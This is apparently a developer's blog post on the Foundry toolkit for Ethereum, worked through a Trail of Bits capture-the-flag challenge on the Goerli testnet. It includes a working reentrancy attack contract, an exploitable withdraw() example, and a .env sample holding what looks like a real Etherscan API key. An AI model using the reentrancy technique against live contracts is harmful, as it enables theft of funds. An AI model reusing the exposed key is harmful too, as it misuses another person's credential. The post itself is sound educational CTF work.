---
layout: post
title:  "Foundry for Ethereum Contracts"
date:   2022-09-09
categories: 
---
* TOC 
{:toc}

Below are my notes on how [Foundry](https://book.getfoundry.sh/) deploys and interacts with Ethereum contracts, illustrated by solving a simple Solidity challenge.
(add summary of everything below SQPT style).

## Foundry

Foundry is an Ethereum smart contract development toolkit like Hardhat, but instead of writing scripts and tests to interact with the blockchain in Javascript, they can be done in Solidity or just command-line. Foundry is made up of 3 CLI tools: forge, cast, and anvil. 

- `forge` is used to compile, test, and deploy contracts
- `cast` is used to perform RPC calls, ie. send txs to the network, read from and interact with contracts
- `anvil` is a local testnet Ethereum node like Hardhat node.
- To start a new project: `forge init`
    - creates new project `src,script,test,lib`
- To set up VS code with solidity support
    - `code` will spin up VS code.
    - `Ctrl + Shift + P` gives Command Palette
    - Search for `Extensions: install Extensions`
    - Install `solidity` by Juan Blanco extensions VS code
    - Run command `Preferences: Open Settings (UI)`
        - set `solidity.packageDefaultDependenciesContractsDirectory` as `src` (where `contracts` folder would refer to in Hardhat)
        - set `solidity.packageDefaultDependenciesDirectory` as `lib` (aka `node_modules` in Hardhat)

## Challenge contract

The below contract is a straight-forward "capture-the-flat" challenge from Trail of Bits. The original deployment can be found [here](https://goerli.etherscan.io/address/0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E#code).

```solidity
pragma solidity 0.8.10;

// The goal of this challenge is to be able to sign offchain a message
// with an address stored in winners.
contract Challenge{
    
    address[] public winners;
    bool lock;

    function exploit_me(address winner) public{
        lock = false;

        msg.sender.call("");

        require(lock);
        winners.push(winner);
    }

    function lock_me() public{
        lock = true;
    }
}
```
If you know about re-entrancy attacks (e.g. the famous DAO attack in 2016 where 3.6 million ETH tokens where drained), the vulnerability with `msg.sender.call("")` will be the first thing to stand out. Often in a `withdraw()` function of a contract, funds are transferred to the requester via a low-level function `call` (see [details](https://solidity-by-example.org/call/)).

```solidity
//exploitable withdraw function, via reentrancy
function withdraw() public{
    (bool sent,)=msg.sender.call{value:bal}();

    //never resets balances mapping
    require(sent,"failed"); 
    balances[msg.sender]=0
}
```

However, sending ether to a contract via `call` triggers either a `receive()` or a `fallback()` function in the receiving contract `msg.sender`, as detailed in [here](https://solidity-by-example.org/sending-ether/). We could deploy a malicious contract with a `fallback()` function which simply calls `withdraw()` in the victim contract again, thus repeatedly re-entering the withdraw function until the victim contract is drained. 

Switching context back to the simple challenge, all we have to do is call `lock_me()` in an attacker contract’s fallback function.


**Attack contract:**

```solidity
pragma solidity 0.8.10;

interface challengeInterface{
    function winners(uint256 i) external returns(address);    
    function exploit_me(address winner) external;
    function lock_me() external;
}

contract MyAttack{    
    //trail of bits challenge addr
    address chAddress = 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E;
    challengeInterface public challengeContract = challengeInterface(chAddress);
    fallback() external{
        challengeContract.lock_me();
    }
    function attack() external {
        challengeContract.exploit_me(msg.sender);
    }
}
```

## Test locally using Foundry

Tests in Foundry are written in Solidity. In command-line, `forge test` scans through the `test` folder and runs all methods with names starting with "test*". For this exercise, we use Goerli testnet. For mainnnet, just omit the `--goerli` tag.

- We need an RPC node, so ensure our Geth node is active and running:  `geth --goerli --http`
    - To check Geth’s syncing status: in another terminal instance, run `geth --goerli attach`, and once attached to the Javascript console, entering `eth.syncing` will return either `false` (good) or details about progress with current block vs. highest block

Testing locally is crucial for debugging since we can print `console.log()` statements, whereas deploying on live testnets cannot (since computation is done remotely on network of machines across the world).

Command: `forge test -vvvv --rpc-url $ETH_RPC_URL`

- In my case, `$ETH_RPC_URL` was `'http://localhost:3333'`
    - I use [SSH tunnelling](http://axucar.ca/2022/08/03/running-geth-node/#ssh-tunneling-local-port-forwarding) from a remote machine to my laptop so the `$ETH_RPC_URL` is `'http://localhost:3333'` instead of the usual `localhost:8545`, when node is running on local machine (local port of 3333 is chosen arbitrarily)
        - As reminder, SSH tunnelling is done through `ssh -L localhost:3333:localhost:8545 remote_machinename@remote_ip`
- Appending `--rpc-url $ETH_RPC_URL` runs the tests on a forked environment at the highest synced block in the provided RPC node endpoint, simulating state changes as if contracts were deployed, without writing permanent changes to the blockchain
    - Optionally, `--fork-block-number <block_num>` can also be used to further specify a precise block height, where `block_num` is something like 7382818 for Goerli. This was useful for testing since the challenge contract was being modified by others (writing to the `winner` array), and I had hard-coded a length (31) for the array in the test script.

Below is my testing script.

```solidity
// File under test/Contract.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;
import "forge-std/Test.sol";
import "src/Attack.sol";

contract ContractTest is Test {
    challengeInterface challenge;
    MyAttack myAttack;
    function setUp() public {
        //trail of bits challenge contract 
        challenge = challengeInterface(0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E);
        myAttack = new MyAttack();
    }

    function testExploit() public {
        address player = 0x08E1Eb1A25E7389488016a25CAcb51D169cd27a3;
        vm.startPrank(player);   //sets msg.sender for contract calls; e.g. as if player is calling the contracts   
                        
        myAttack.attack();
        console.log(challenge.winners(31)); //should show our player

        vm.stopPrank();
    }
}
```

Printing `console.log(challenge.winners(31))` confirmed my `player` address had been added to the `winner` array. I know the index of the last element should be 31 by checking the value at the first storage slot of the challenge contract, since `winners` is the first declared variable of the challenge contract. For dynamic arrays, the storage slot corresponding to the variable stores the number of elements in the array (see [storage layout docs](https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#mappings-and-dynamic-arrays)).

To query the first storage slot of the challenge contract: 

- `cast storage 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E 0 --block 7382818` , which returns `0x000000000000000000000000000000000000000000000000000000000000001f` = 31.


## Deploy to Goerli testnet

Command: `forge create src/Attack.sol:MyAttack --verify`

- Beforehand, define and source `.env` file with keystore path (for sender authentication, and Etherscan API for verifying contracts). See [section below](#create-keystore-account-in-geth) on how to create keystores
```solidity
//source this .env file
ETHERSCAN_API_KEY=ZSED47H9XHGGHAJT86FXPC1Y57YGRM1H3R
ETH_KEYSTORE=/home/chihiro/.ethereum/goerli/keystore/UTC--2022-08-07T23-58-04.686858789Z--08e1eb1a25e7389488016a25cacb51d169cd27a3
ETH_RPC_URL='http://localhost:3333' //running Goerli node
```
- Appending `—verify` flag adds Etherscan contract verifcation. Thus, anyone can read the contract source code on Etherscan, which has been verified to compile to the bytecode (ie. low level machine language executed by the EVM, which uniquely defines the logic for how contract behaves).
- Set `solc = '0.8.10'` in `foundry.toml` to match the Solidity version used by my contracts.
    
Deployed the [Attack contract](https://goerli.etherscan.io/address/0x6d4b8b1025f758f41F440b511A10d9faa4B50384#code) with verified code at `0x6d4b8b1025f758f41F440b511A10d9faa4B503841`.
    

### Create keystore account in Geth
A keystore can be understood as a private key encrypted by a password. To write anything on-chain, we need a keystore (or a raw private key).
- In the machine running the Geth node, create an account via `geth --goerli account new`
    - generates keystores at `/home/chihiro/.ethereum/goerli/keystore`
    - REMEMBER THE PASSWORD! We are prompted for it any time we use the keystore
    - note down the address. For example, `0x08e1eb1a25e7389488016a25cacb51d169cd27a3` is mine
    - To confirm its creation, attach to the Geth Javascript console: `geth --goerli attach` : now we should see the newly created account when calling `eth.accounts`
    - Keystore is generated in `/home/chihiro/.ethereum/goerli/keystore`
- Next, request some Goerli ETH from Alchemy faucet, or Paradigm's faucet
- As an alternative to using your own Geth node and corresponding keystore, you can instead specify an `ETH_RPC_URL` from a node provider like Alchemy and provide explicit private keys
    - If you choose to specify explicit private keys, it requires adding `--private-key $PRIVATE_KEY` to Foundry commands that write to the blockchain, e.g. `forge create`, `cast send`, etc.

```solidity
//source this .env file
ETHERSCAN_API_KEY=<YOUR_API_KEY>
ETH_RPC_URL='https://eth-goerli.g.alchemy.com/v2/<API_KEY>'
PRIVATE_KEY=<64-HEX-CHAR-PRIVKEY>
ETH_FROM=<40-HEX-CHAR-ADDRESS>
```

## Using Cast to Read + Interact + Sign

Cast has a variety of use-cases.

- **Write**: publish tx: `cast send <contract_addr> "fn()"`\\
For example, to finish our attack above, we call `attack()` on the deployed attack contract. \\
	- `cast send <attack_addr> "attack()" --gas-limit 120000`
    - Ran out of gas at first, needed to add gas-limit. Possible that `cast estimate <attack_addr> "attack()"` is off sometimes (which it runs implicitly).
- **Read**: read on-chain data (no gas required, and no private key needed) `cast call <contract addr> “fn(input_type)(output_type)”`\\
To confirm we completed the challenge, we verify that `0x08E1Eb1A25E7389488016a25CAcb51D169cd27a3` is on the `winners` array written permanently on the blockchain. \\
	- `cast call 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E "winners(uint256)(address)" 24`
- **Sign:** we can also sign messages off-chain. For instance, below I prove that I (Carlos) am the owner of the address inside the `winner` array.

For any judge to verify the validity of a signature (e.g. via Etherscan Verified Signatures [https://etherscan.io/verifiedSignatures#](https://etherscan.io/verifiedSignatures#)): we require 3 pieces of data. 

1. Signer Address (ie. address in `winner` array): `0x08E1Eb1A25E7389488016a25CAcb51D169cd27a3`
2. Message: “My name is Carlos Xu, and I completed the challenge at 0xd101a9081dc733f1e2cd51454cbed7e3e2c8644dde049ea22d49bc036af3988d”
3. Signature: `0x85c606541bddf728111f93ba5e70310133fe5b06d5f51882508dcdaaf0cb969c083f0864e8c9f8ff6d1cdc48892bc8fc39f60cb41512145630d1a97d12db79c31c`
	- `cast wallet sign <message>` returns the signature
    - Only someone with access to keystore of the signer address could have produced this signature corresponding to the message. However, anyone can verify this signature to be valid.

If anyone else (with a different private key and hence signer address) tries to generate a signature on the same message string, the signature will be entirely different. 
Thus, the above suffices to prove that the owner of the private key for `0x08E1Eb1A25E7389488016a25CAcb51D169cd27a3` wrote the above message claiming to be Carlos.




